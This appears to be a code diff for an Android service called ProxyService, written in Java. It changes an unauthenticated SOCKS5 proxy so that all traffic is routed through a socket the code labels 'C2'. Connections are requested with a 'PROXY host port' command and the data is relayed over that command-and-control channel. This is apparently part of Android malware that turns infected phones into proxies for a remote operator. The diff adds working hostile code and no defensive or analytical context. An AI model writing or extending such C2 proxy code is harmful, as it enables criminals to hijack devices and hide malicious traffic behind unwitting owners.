@@ -72,15 +72,16 @@ public class ProxyService extends Service {
         try {
             InputStream in = client.getInputStream();
             OutputStream out = client.getOutputStream();
+            byte[] buffer = new byte[1024];
 
             // SOCKS5 handshake
-            byte[] buffer = new byte[1024];
             int len = in.read(buffer);
             if (len < 1 || buffer[0] != 0x05) {
                 client.close();
                 return;
             }
 
+            // No authentication
             out.write(new byte[]{0x05, 0x00});
             out.flush();
 
@@ -118,11 +119,23 @@ public class ProxyService extends Service {
 
             Log.d(TAG, "SOCKS5: " + host + ":" + port);
 
-            // Connect to destination
-            Socket target = new Socket();
-            target.connect(new InetSocketAddress(host, port), 10000);
+            // --- ROUTE THROUGH C2 SOCKET ---
+            PrintWriter c2Writer = new PrintWriter(c2Socket.getOutputStream(), true);
+            BufferedReader c2Reader = new BufferedReader(
+                new InputStreamReader(c2Socket.getInputStream())
+            );
 
-            // Send success
+            // Send PROXY command through C2
+            c2Writer.println("PROXY " + host + " " + port);
+
+            // Wait for CONNECTED response
+            String response = c2Reader.readLine();
+            if (response == null || !response.equals("CONNECTED")) {
+                client.close();
+                return;
+            }
+
+            // Send SOCKS5 success
             byte[] success = new byte[10];
             success[0] = 0x05;
             success[1] = 0x00;
@@ -131,46 +144,46 @@ public class ProxyService extends Service {
             out.write(success);
             out.flush();
 
-            // Relay data
-            relayData(client, target);
+            // Relay data through C2 socket
+            relayData(client);
 
         } catch (Exception e) {
             Log.e(TAG, "Proxy error: " + e.getMessage());
         }
     }
 
-    private void relayData(Socket client, Socket target) {
+    private void relayData(Socket client) {
         try {
-            InputStream in1 = client.getInputStream();
-            OutputStream out1 = client.getOutputStream();
-            InputStream in2 = target.getInputStream();
-            OutputStream out2 = target.getOutputStream();
+            InputStream clientIn = client.getInputStream();
+            OutputStream clientOut = client.getOutputStream();
+            InputStream c2In = c2Socket.getInputStream();
+            OutputStream c2Out = c2Socket.getOutputStream();
 
             byte[] buffer = new byte[8192];
             boolean[] closed = {false};
 
+            // Client -> C2
             Thread t1 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = in1.read(buffer)) != -1) {
-                        out2.write(buffer, 0, len);
-                        out2.flush();
+                    while ((len = clientIn.read(buffer)) != -1) {
+                        c2Out.write(buffer, 0, len);
+                        c2Out.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
-                closeSockets(client, target);
             });
 
+            // C2 -> Client
             Thread t2 = new Thread(() -> {
                 try {
                     int len;
-                    while ((len = in2.read(buffer)) != -1) {
-                        out1.write(buffer, 0, len);
-                        out1.flush();
+                    while ((len = c2In.read(buffer)) != -1) {
+                        clientOut.write(buffer, 0, len);
+                        clientOut.flush();
                     }
                 } catch (Exception e) {}
                 closed[0] = true;
-                closeSockets(client, target);
             });
 
             t1.start();
@@ -180,14 +193,11 @@ public class ProxyService extends Service {
                 Thread.sleep(100);
             }
 
+            try { client.close(); } catch (Exception e) {}
+
         } catch (Exception e) {
             Log.e(TAG, "Relay error: " + e.getMessage());
         }
-    }
-
-    private void closeSockets(Socket s1, Socket s2) {
-        try { s1.close(); } catch (Exception e) {}
-        try { s2.close(); } catch (Exception e) {}
     }
 
     @Override
